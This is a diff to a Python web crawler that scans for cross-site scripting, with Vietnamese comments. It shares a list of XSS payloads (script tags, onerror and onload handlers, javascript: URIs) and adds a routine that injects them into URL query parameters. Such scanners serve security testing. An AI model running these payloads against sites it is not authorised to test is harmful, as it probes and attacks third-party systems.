@@ -1,6 +1,6 @@
 import requests
 import re
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, urlencode, parse_qs
 import colorama
 from colorama import Fore, Style
 from collections import deque
@@ -17,6 +17,20 @@ logging.basicConfig(filename='xss_scan_results.log', level=logging.INFO, format=
 visited_urls = set()
 # Khóa để đảm bảo an toàn khi truy cập 'visited_urls' trong môi trường đa luồng
 visited_urls_lock = threading.Lock()
+
+payloads = [
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<script>alert("XSS")</script>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    'javascript:alert("XSS")',
+    '<body onload=alert("XSS")>',
+    '"><svg/onload=alert("XSS")>',
+    '<iframe src="javascript:alert(\'XSS\');">',
+    '\'"--><script>alert("XSS")</script>',
+    '<img src="x" onerror="alert(\'XSS\')">',
+    '<input type="text" value="<script>alert(\'XSS\')</script">',
+]
 
 def extract_internal_links(url, session):
     """
@@ -55,23 +69,10 @@ def is_same_domain(url, base_url):
     parsed_base_url = urlparse(base_url)
     return parsed_url.netloc == parsed_base_url.netloc
 
-def perform_xss_checks_input(url, input_fields):
+def perform_xss_checks_input(url, input_fields, payloads):
     """
     Hàm kiểm tra XSS trên các thẻ input
     """
-    payloads = [
-        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-        '<script>alert("XSS")</script>',
-        '"><script>alert("XSS")</script>',
-        '"><img src=x onerror=alert("XSS")>',
-        'javascript:alert("XSS")',
-        '<body onload=alert("XSS")>',
-        '"><svg/onload=alert("XSS")>',
-        '<iframe src="javascript:alert(\'XSS\');">',
-        '\'"--><script>alert("XSS")</script>',
-        '<img src="x" onerror="alert(\'XSS\')">',
-        '<input type="text" value="<script>alert(\'XSS\')</script">',
-    ]
     for input_field in input_fields:
         vulnerable = False
         for payload in payloads:
@@ -88,23 +89,10 @@ def perform_xss_checks_input(url, input_fields):
         else:
             print(f'AN TOÀN: {input_field} trong {url}')
 
-def perform_xss_checks_textarea(url, textarea_fields):
+def perform_xss_checks_textarea(url, textarea_fields, payloads):
     """
     Hàm kiểm tra XSS trên các thẻ textarea
     """
-    payloads = [
-        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
-        '<script>alert("XSS")</script>',
-        '"><script>alert("XSS")</script>',
-        '"><img src=x onerror=alert("XSS")>',
-        'javascript:alert("XSS")',
-        '<body onload=alert("XSS")>',
-        '"><svg/onload=alert("XSS")>',
-        '<iframe src="javascript:alert(\'XSS\');">',
-        '\'"--><script>alert("XSS")</script>',
-        '<img src="x" onerror="alert(\'XSS\')">',
-        '<input type="text" value="<script>alert(\'XSS\')</script">',
-    ]
     for textarea_field in textarea_fields:
         vulnerable = False
         for payload in payloads:
@@ -118,6 +106,30 @@ def perform_xss_checks_textarea(url, textarea_fields):
             logging.info(f'NGUY HIỂM: {textarea_field} trong {url} | payload: {payload}')
         else:
             print(f'An toàn: {textarea_field} trong {url}')
+
+def inject_payloads_to_url(url, payloads):
+    """
+    Hàm thêm payload vào tham số URL và kiểm tra phản hồi
+    """
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+
+    for param in query_params:
+        for payload in payloads:
+            modified_params = query_params.copy()
+            modified_params[param] = payload
+            modified_query = urlencode(modified_params, doseq=True)
+            modified_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
+
+            try:
+                response = requests.get(modified_url, headers={'User-Agent': 'Mozilla/5.0'})
+                if payload in response.text:
+                    print(f'{Fore.RED}NGUY HIỂM{Style.RESET_ALL}: {param} trong {modified_url} với payload: {payload}')
+                    logging.info(f'NGUY HIỂM: {param} trong {modified_url} với payload: {payload}')
+                else:
+                    print(f'AN TOÀN: {param} trong {modified_url}')
+            except requests.RequestException as e:
+                print(f"{Fore.YELLOW}Cảnh báo: Không thể truy xuất {modified_url}: {e}{Style.RESET_ALL}")
 
 def login(session, login_url, username, password):
     """
@@ -168,8 +180,10 @@ def perform_xss_checks(url, login_url=None, username=None, password=None, max_de
                 input_fields = re.findall(r'<input.*?type=["\']text["\'].*?>', page_content, flags=re.IGNORECASE)
                 textarea_fields = re.findall(r'<textarea.*?>.*?</textarea>', page_content, flags=re.IGNORECASE)
                 # Kiểm tra XSS trên các thẻ input và textarea
-                perform_xss_checks_input(current_url, input_fields)
-                perform_xss_checks_textarea(current_url, textarea_fields)
+                perform_xss_checks_input(current_url, input_fields, payloads)
+                perform_xss_checks_textarea(current_url, textarea_fields,payloads)
+                # Kiểm tra XSS bằng cách chèn payload vào tham số URL
+                inject_payloads_to_url(current_url, payloads)
                 # Trích xuất các liên kết nội bộ
                 internal_links = extract_internal_links(current_url, session)
                 for link in internal_links:
